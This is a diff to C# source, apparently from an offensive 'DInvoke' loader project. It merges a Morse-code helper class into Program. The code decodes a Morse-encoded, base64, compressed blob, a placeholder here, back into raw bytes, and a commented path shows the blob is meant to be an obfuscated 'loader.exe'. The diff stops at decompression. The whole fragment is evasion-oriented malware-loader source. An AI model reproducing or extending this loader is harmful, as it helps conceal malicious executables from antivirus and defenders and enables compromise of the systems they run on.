@@ -13,7 +13,7 @@ using System.Text;
 
 namespace DInvoke
 {
-    public class MorseForFun
+    public class Program
     {
         private static Dictionary<char, string> _morseAlphabetDictionary;
 
@@ -62,10 +62,7 @@ namespace DInvoke
 
             return stringBuilder.ToString();
         }
-    }
 
-    class Program
-    {
         public static byte[] Decompress(byte[] data)
         {
             MemoryStream input = new MemoryStream(data);
@@ -87,7 +84,7 @@ namespace DInvoke
             return output.ToArray();
         }
 
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             /*
                var b64PEBuffer = @"C:\Users\REUSER\source\repos\ObfuscatorXOR\loader\x64\Release\loader.exe";
@@ -100,9 +97,9 @@ namespace DInvoke
                */
             string morsedb64string = "REPLACE MORSECODE HERE";
 
-            MorseForFun.InitializeDictionary();
+            InitializeDictionary();
 
-            string b64string = MorseForFun.Receive(morsedb64string);
+            string b64string = Receive(morsedb64string);
 
             var bufferByteArray = Convert.FromBase64String(b64string);
             var deCompByteArray = Decompress(bufferByteArray);
